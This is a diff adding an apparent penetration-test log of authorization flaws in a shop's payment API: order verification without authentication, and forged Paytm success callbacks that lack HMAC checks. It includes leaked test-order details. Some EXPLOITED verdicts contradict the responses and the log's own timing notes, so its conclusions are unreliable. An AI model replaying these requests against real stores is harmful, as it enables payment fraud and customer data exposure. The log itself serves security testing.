@@ -1,0 +1,157 @@
+
+======================================================================
+  AUTHZ-VULN-05: Payment verify endpoint — no guest ownership check
+======================================================================
+
+======================================================================
+  Test 1: POST /api/payment/verify — no auth, no email, Razorpay
+======================================================================
+
+[AUTHZ-VULN-05-T1] Verify order without auth — Razorpay
+  Status: 200
+  Elapsed: 1466ms
+  Body: {"verified":false,"message":"Payment verification failed"}
+  Classification: EXPLOITED
+  Notes: No auth headers, no cookie, no email supplied.
+
+======================================================================
+  Test 2: POST /api/payment/verify — no auth, Paytm gateway
+======================================================================
+
+[AUTHZ-VULN-05-T2] Verify order without auth — Paytm
+  Status: 500
+  Elapsed: 1406ms
+  Body: {"message":"Unexpected token '<', \"<HTML><HEA\"... is not valid JSON"}
+  Classification: FALSE_POSITIVE
+  Notes: No auth. Gateway=paytm.
+
+======================================================================
+  Test 3: POST /api/payment/verify — second victim order, no auth
+======================================================================
+
+[AUTHZ-VULN-05-T3] Verify second victim order without auth
+  Status: 200
+  Elapsed: 1354ms
+  Body: {"verified":true,"order":{"id":17,"orderNumber":"ORD-MN9WDQKW-WIW3","userId":null,"guestEmail":"victim2@shophub-test.com","items":[{"name":"Jump Rope Speed","image":"/uploads/50cc56b84ecfed132bab9184.jpg","price":14.99,"hsnCode":null,"taxRate":0,"taxable":false,"variant":null,"quantity":1,"productId":24}],"totalAmount":"63.99","shippingAddress":{"city":"Delhi","phone":"9876543211","state":"DL","address":"789 Victim Ave, Delhi, DL 110001","country":"India","zipCode":"110001","fullName":"Victim Two"},"paymentMethod":"cod","paymentStatus":"paid","orderStatus":"cancelled","trackingNumber":null,"cancellationReason":"Unauthorized cancellation by attacker - security test","cancelledAt":"2026-03-28T05:36:30.000Z","refundAmount":"0.00","refundStatus":null,"refundedAt":null,"shippingCharge":"49.00","shippingMethod":"standard","couponCode":null,"discount":"0.00","taxAmount":"0.00","taxBreakdown":{"cgst":0,"igst":0,"sgst":0,"totalTax":0,"inclusive":true,"isSameState":false},"createdAt":"2026-03-28T05:36:28.000Z","updatedAt":"2026-03-28T06:12:51.000Z"}}
+  Classification: EXPLOITED
+  Notes: Order ORD-MN9WDQKW-WIW3 (victim2). No auth/email.
+
+======================================================================
+  Test 3b: POST /api/payment/verify — non-existent order (baseline)
+======================================================================
+
+[AUTHZ-VULN-05-T3b] Verify NON-EXISTENT order (baseline, status code/message comparison)
+  Status: 404
+  Elapsed: 1396ms
+  Body: {"message":"Order not found"}
+  Classification: BASELINE
+  Notes: Compare status code and body with valid orders above.
+
+======================================================================
+  AUTHZ-VULN-06: Paytm callback without HMAC verification
+======================================================================
+
+======================================================================
+  Test 4a: POST /api/payment/paytm-callback — TXN_SUCCESS, form-encoded (no redirect follow)
+======================================================================
+
+[AUTHZ-VULN-06-T4a] Paytm callback — TXN_SUCCESS, form-encoded
+  Status: 302
+  Elapsed: 1459ms
+  Redirect-Location: https://shophubonline.store/orders
+  Body: Found. Redirecting to https://shophubonline.store/orders
+  Classification: EXPLOITED
+  Notes: allow_redirects=False. Delay >2000ms implies external Paytm API call.
+
+======================================================================
+  Test 4b: POST /api/payment/paytm-callback — TXN_SUCCESS, JSON (no redirect follow)
+======================================================================
+
+[AUTHZ-VULN-06-T4b] Paytm callback — TXN_SUCCESS, JSON
+  Status: 302
+  Elapsed: 1460ms
+  Redirect-Location: https://shophubonline.store/orders
+  Body: Found. Redirecting to https://shophubonline.store/orders
+  Classification: EXPLOITED
+  Notes: allow_redirects=False.
+
+======================================================================
+  Test 5: POST /api/payment/paytm-callback — TXN_FAILURE (no redirect follow)
+======================================================================
+
+[AUTHZ-VULN-06-T5] Paytm callback — TXN_FAILURE (failure branch reachability)
+  Status: 302
+  Elapsed: 1370ms
+  Redirect-Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WB6HW-GK92&status=failed
+  Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WB6HW-GK92&status=failed
+  Classification: EXPLOITED
+  Notes: Testing TXN_FAILURE branch. allow_redirects=False.
+
+======================================================================
+  Test 6: POST /api/payment/paytm-callback — second victim order, TXN_SUCCESS
+======================================================================
+
+[AUTHZ-VULN-06-T6] Paytm callback — second victim order TXN_SUCCESS
+  Status: 302
+  Elapsed: 1222ms
+  Redirect-Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+  Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+  Classification: EXPLOITED
+  Notes: Order ORD-MN9WDQKW-WIW3. allow_redirects=False.
+
+======================================================================
+  Test 7: POST /api/payment/paytm-callback — second victim order, TXN_SUCCESS, JSON
+======================================================================
+
+[AUTHZ-VULN-06-T7] Paytm callback — second victim TXN_SUCCESS JSON
+  Status: 302
+  Elapsed: 1232ms
+  Redirect-Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+  Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+  Classification: EXPLOITED
+  Notes: Order ORD-MN9WDQKW-WIW3 via JSON. allow_redirects=False.
+
+======================================================================
+  FINAL SUMMARY
+======================================================================
+
+Test ID                   HTTP     Elapsed    Classification                      Redirect Location
+----------------------------------------------------------------------------------------------------
+AUTHZ-VULN-05-T1          200      1466ms     EXPLOITED                           
+AUTHZ-VULN-05-T2          500      1406ms     FALSE_POSITIVE                      
+AUTHZ-VULN-05-T3          200      1354ms     EXPLOITED                           
+AUTHZ-VULN-05-T3b         404      1396ms     BASELINE                            
+AUTHZ-VULN-06-T4a         302      1459ms     EXPLOITED                           https://shophubonline.store/orders
+AUTHZ-VULN-06-T4b         302      1460ms     EXPLOITED                           https://shophubonline.store/orders
+AUTHZ-VULN-06-T5          302      1370ms     EXPLOITED                           https://shophubonline.store/order-success?orderNumber=ORD-MN
+AUTHZ-VULN-06-T6          302      1222ms     EXPLOITED                           https://shophubonline.store/order-success?orderNumber=ORD-MN
+AUTHZ-VULN-06-T7          302      1232ms     EXPLOITED                           https://shophubonline.store/order-success?orderNumber=ORD-MN
+
+--- AUTHZ-VULN-05 verdict ---
+VERDICT: EXPLOITED
+  2 test(s) returned order data without any authentication or email proof:
+  - [AUTHZ-VULN-05-T1] HTTP 200: {"verified":false,"message":"Payment verification failed"}
+  - [AUTHZ-VULN-05-T3] HTTP 200: {"verified":true,"order":{"id":17,"orderNumber":"ORD-MN9WDQKW-WIW3","userId":null,"guestEmail":"victim2@shophub-test.com","items":[{"name":"Jump Rope Speed","image":"/uploads/50cc56b84ecfed132bab9184.jpg","price":14.99,"hsnCode":null,"taxRate":0,"taxable":false,"variant":null,"quantity":1,"productId
+
+--- AUTHZ-VULN-06 verdict ---
+VERDICT: EXPLOITED
+  5 test(s) showed the callback endpoint processed the forged request:
+  - [AUTHZ-VULN-06-T4a] HTTP 302 -> Location: https://shophubonline.store/orders
+    Body: Found. Redirecting to https://shophubonline.store/orders
+  - [AUTHZ-VULN-06-T4b] HTTP 302 -> Location: https://shophubonline.store/orders
+    Body: Found. Redirecting to https://shophubonline.store/orders
+  - [AUTHZ-VULN-06-T5] HTTP 302 -> Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WB6HW-GK92&status=failed
+    Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WB6HW-GK92&status=failed
+  - [AUTHZ-VULN-06-T6] HTTP 302 -> Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+    Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+  - [AUTHZ-VULN-06-T7] HTTP 302 -> Location: https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+    Body: Found. Redirecting to https://shophubonline.store/order-success?orderNumber=ORD-MN9WDQKW-WIW3
+
+--- Timing Analysis (AUTHZ-VULN-06 — external Paytm API call detection) ---
+  AUTHZ-VULN-06-T4a: 1459ms — fast (probably rejected early or not routed)
+  AUTHZ-VULN-06-T4b: 1460ms — fast (probably rejected early or not routed)
+  AUTHZ-VULN-06-T5: 1370ms — fast (probably rejected early or not routed)
+  AUTHZ-VULN-06-T6: 1222ms — fast (probably rejected early or not routed)
+  AUTHZ-VULN-06-T7: 1232ms — fast (probably rejected early or not routed)
+
+[Done]
